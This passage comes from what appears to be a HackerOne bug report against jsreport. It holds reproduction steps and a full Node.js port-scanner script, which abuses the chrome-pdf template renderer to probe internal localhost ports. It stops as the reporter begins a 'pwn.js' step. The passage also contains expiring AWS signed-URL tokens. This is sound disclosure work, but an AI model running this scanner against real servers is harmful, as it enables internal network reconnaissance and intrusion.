data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/731/14a391406a890e7451189416eacc3c6e73d29f7a/screen2.png?response-content-disposition=attachment%3B%20filename%3D%22screen2.png%22%3B%20filename%2A%3DUTF-8%27%27screen2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=160a39b9986a03dbd0cf29a515d7708bad30ce45e261d884d09cdeabd437658e\" data-attachment-type=\"image/png\"\u003escreen2.png (F539731)\u003c/a\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ewrite some HTML to it (e.g. \u003ccode\u003e\u0026lt;h1\u0026gt;hello world\u0026lt;/h1\u0026gt;\u003c/code\u003e) and click \u0026#39;Save\u0026#39;\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"screen3_1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/742/c4aca7f0e1feb03a46e61279e411989facf465ca/screen3_1.png?response-content-disposition=attachment%3B%20filename%3D%22screen3_1.png%22%3B%20filename%2A%3DUTF-8%27%27screen3_1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=6166380467d783f7487712e71f3a002c0d8b27d67a286c75f865be62ad05d561\" data-attachment-type=\"image/png\"\u003escreen3_1.png (F539742)\u003c/a\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ecreate portScanner.js localy (outside docker container)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eportScanner.js\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003econst request = require(\u0026#39;request\u0026#39;)\n\nconst name = process.argv[2] // name of the template\nconst id = process.argv[3] // id of the template\nconst chunkSize = 1000\nconst jrUrl = process.argv[4]\n  ? `${process.argv[4]}/api/report/${name}` // jsreport url if it is different from localhost\n  : `http://localhost/api/report/${name}`\n\nfunction requestPromise(options) {\n  return new Promise((resolve, reject) =\u0026gt; {\n    request.post(options, function optionalCallback(err, httpResponse, body) {\n      if (err) {\n        return reject(err)\n      }\n      resolve(body)\n    });\n  })\n}\n\nasync function checkPorts(start, finish) {\n  let content = `\n  \u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003eprintImg\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehttp://localhost:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n          \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eresultDiv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eresult\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n          \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eimg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateElement\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eimg\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n          \u003cspan class=\"nx\"\u003eimg\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esrc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eports\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[];\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003estart\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003estart\u003c/span\u003e\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003efinish\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003efinish\u003c/span\u003e\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n        \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003estart\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan class=\"nx\"\u003efinish\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eports\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eports\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eforEach\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"nx\"\u003eprintImg\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n  `\n  const formData = {\n    template: {\n      name: name,\n      recipe: \u0026#39;chrome-pdf\u0026#39;,\n      shortid: id,\n      __entitySet: \u0026#39;templates\u0026#39;,\n      __name: name,\n      engine: \u0026#39;handlebars\u0026#39;,\n      chrome: {printBackground: \u0026#39;true\u0026#39;},\n      content: content,\n      __isLoaded: \u0026#39;true\u0026#39;,\n      __recipe: \u0026#39;chrome-pdf\u0026#39;,\n      __shortid: id,\n      __isDirty: \u0026#39;false\u0026#39;\n    },\n    options: {\n      debug: {\n        logsToResponse: \u0026#39;true\u0026#39;\n      },\n      preview: \u0026#39;true\u0026#39;\n    }\n  }\n\n  const body = await requestPromise({url: jrUrl, form: formData})\n  if (body.indexOf(\u0026#39;connect ECONNREFUSED 127.0.0.1:\u0026#39;) \u0026gt; -1) {\n    const rgx = /connect ECONNREFUSED 127.0.0.1:(\\d*)/g\n    const match = rgx.exec(body)\n    console.log(\u0026#39;match\u0026#39;, match)\n    return match[1] || true\n  } else if (body.indexOf(\u0026#39;Failed to load resource: the server responded with a status of 500 (Internal Server Error)\u0026#39;) \u0026gt; -1) {\n    return true\n  } else \n  return false\n}\n\n// checking ports by `divide and conquer` approach\n// which means checking a huge chunk of ports at once an then narrowing down till we hit the only possible port\n// takes about 16 iterations to figure it out\n// anyway its faster then manually checking 65k ports\nasync function checker(start, finish) {\n  const rp = await checkPorts(start, finish)\n  if (rp) {\n    if (typeof rp === \u0026#39;string\u0026#39;) { // string is returned when port is extracted from an error message\n      return rp\n    } else if (start === finish) {\n      return start\n    } else {\n      const middle = Math.floor((finish + start) / 2)\n      const tmp1 = await checker(start, middle)\n      const tmp2 = await checker(middle+1, finish)\n      return tmp1 || tmp2\n    }\n  }\n}\n\n(async function main(){\n  // ports range\n  const start = 1024\n  const finish = 65535\n\n  // split ports range into chunks of 1000\n  let first = start\n  let last = start + 1000\n\n  let stopEnum = false\n  while (!stopEnum) {\n    if ( last \u0026gt; finish ) {\n      last = finish\n      stopEnum = true\n    }\n    // checking every port from `first` to `last`\n    const result = await checker(first, last)\n    if (result) {\n      console.log(result);\n      return;\n    }\n    first = last + 1\n    last = first + 1000\n  }\n})()\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003erun portScanner.js\u003c/p\u003e\n\n\u003cp\u003enode portScanner.js \u003cstrong\u003etest1\u003c/strong\u003e \u003cstrong\u003etemplateId\u003c/strong\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003ewhere \u003cstrong\u003etest1\u003c/strong\u003e - name of the template (actually \u0026#39;test1\u0026#39; that we created previously)\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003etemplateId\u003c/strong\u003e - id of the template (may be extracted from the temlates URL)\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"______________2019-07-26_14-28-56.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/733/1d32bc573f32c7b191a8b4082fb783982f50153d/______________2019-07-26_14-28-56.png?response-content-disposition=attachment%3B%20filename%3D%22______________2019-07-26_14-28-56.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-07-26_14-28-56.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=c2dd1713dfdf13f72707b443bc0226c60fa32b65bcb7f2657ca0bc0578348a90\" data-attachment-type=\"image/png\"\u003e______________2019-07-26_14-28-56.png (F539733)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003ee.g. node portScanner.js test1 BJe2Pi2AgB\u003c/p\u003e\n\n\u003cp\u003eif you don\u0026#39;t run docker on \u003ca href=\"/redirect?url=http%3A%2F%2Flocalhost\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003elocalhost\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e you may add docker\u0026#39;s address as a 3rd parameter (check portScanner.js code for clarity)\u003c/p\u003e\n\n\u003cp\u003ee.g \u003ca title=\"http://my-jsreport-addr.app\" href=\"/redirect?url=http%3A%2F%2Fmy-jsreport-addr.app\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://my-jsreport-addr.app\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003enode portScanner.js test1 id_from_jsreport http://my-jsreport-addr.app\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003ewait untill it finishes and logs the port number\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"12354.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/741/fa2a05e74e47e34935006c90d4cb0dc47a9576e9/12354.png?response-content-disposition=attachment%3B%20filename%3D%2212354.png%22%3B%20filename%2A%3DUTF-8%27%2712354.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=4b287578e0be68283a7dbd9fe33dcbcbd80ea21c49abd3ef9fba6ff8a4b94fdb\" data-attachment-type=\"image/png\"\u003e12354.png (F539741)\u003c/a\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ethen create a new script in \u003ccode\u003ejsreport\u003c/code\u003e and name it \u0026#39;pwn.js\u0026#39;\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"screen4_1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/734/e1048d7fcf785a6b698da647aa5f68fb4d11481a/screen4_1.png?response-content-disposition=attachment%3B%20filename%3D%22screen4_1.png%22%3B%20filename%2A%3DUTF-8%27%27screen4_1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=dd8f7e3a8ab970a3d13d9cb8bc2371246b9877accb0a1b16da8999a27b26d386\" data-attachment-type=\"image/png\"\u003escreen4_1.png (F539734)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"screen_5.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/735/ec06901edc3e787a98506c11f656b2dafcb9d3df/screen_5.png?response-content-disposition=attachment%3B%20filename%3D%22screen_5.png%22%3B%20filename%2A%3DUTF-8%27%27screen_5.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4